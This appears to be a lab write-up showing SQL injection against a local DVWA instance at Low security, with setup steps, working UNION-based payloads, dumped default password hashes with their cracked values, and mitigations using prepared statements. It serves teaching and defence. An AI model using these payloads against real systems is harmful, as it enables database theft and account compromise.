# Task 3: SQL Injection on DVWA (Low Security)

## Objective
Demonstrate an SQL Injection vulnerability on DVWA (Damn Vulnerable Web Application) with security level set to Low.

---

## Tools Used
| Tool | Purpose |
|------|---------|
| Docker | Run DVWA locally |
| DVWA | Vulnerable web application target |
| Browser | Manual SQL injection |
| curl | Automated exploit script |

---

## Setup

### 1. Install and Run DVWA
```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```
Open browser at `http://localhost` and login with:
- **Username:** admin
- **Password:** password

### 2. Configure DVWA
- Go to `http://localhost/setup.php`
- Click **Create / Reset Database**
- Login again with admin / password

### 3. Set Security Level to Low
- Click **DVWA Security** in the sidebar
- Set dropdown to **Low**
- Click **Submit**

---

## SQL Injection Attack

### Target Page
```
http://localhost/vulnerabilities/sqli/
```

### Step 1 — Confirm Vulnerability
**Payload:**
```
' OR 1=1-- -
```
**Result:** All 5 users returned — confirms raw input reaches the SQL query.

---

### Step 2 — Determine Column Count
**Payload:**
```
1' ORDER BY 2-- -
```
**Result:** No error = 2 columns confirmed.

---

### Step 3 — Dump All Usernames and Password Hashes
**Payload:**
```
' UNION SELECT user, password FROM users-- -
```

**Result:**
```
First name: admin      | Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb    | Surname: e99a18c428cb38d5f260853678922e03
First name: 1337       | Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo      | Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy     | Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

---

### Step 4 — Crack MD5 Hashes
| Username | MD5 Hash | Cracked Password |
|----------|----------|-----------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

---

## Vulnerability Explanation

### Why It Is Vulnerable
The DVWA SQL Injection page (Low security) directly concatenates user input into the SQL query without any sanitisation:

```php
// Vulnerable code (low security)
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

When a user inputs `' UNION SELECT user, password FROM users-- -`, the query becomes:

```sql
SELECT first_name, last_name FROM users WHERE user_id = ''
UNION SELECT user, password FROM users-- -';
```

This allows an attacker to append their own SQL and extract any data from the database.

---

## How to Run the Exploit Script

```bash
# Make executable
chmod +x sql_injection_exploit.sh

# Update PHPSESSID in the script with your session cookie
# Then run:
./sql_injection_exploit.sh
```

---

## Mitigation

| Fix | Description |
|-----|-------------|
| Prepared statements | Separates SQL code from user data |
| Input validation | Reject special characters like `'`, `--`, `UNION` |
| Least privilege DB user | Limit what the DB account can access |
| WAF | Web Application Firewall to block SQLi patterns |
| Error handling | Never show raw SQL errors to users |

### Secure Code Example
```php
// Secure version using prepared statements
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

---

## Screenshots
See `/screenshots/` folder for:
- `01_dvwa_setup.png` — DVWA running on localhost
- `02_security_low.png` — Security level set to Low
- `03_sqli_confirm.png` — All users dumped with OR 1=1
- `04_sqli_union.png` — Usernames and hashes extracted

---

## Disclaimer
This lab is performed in a controlled local environment for educational purposes only. Never perform SQL injection attacks on systems without explicit written permission.
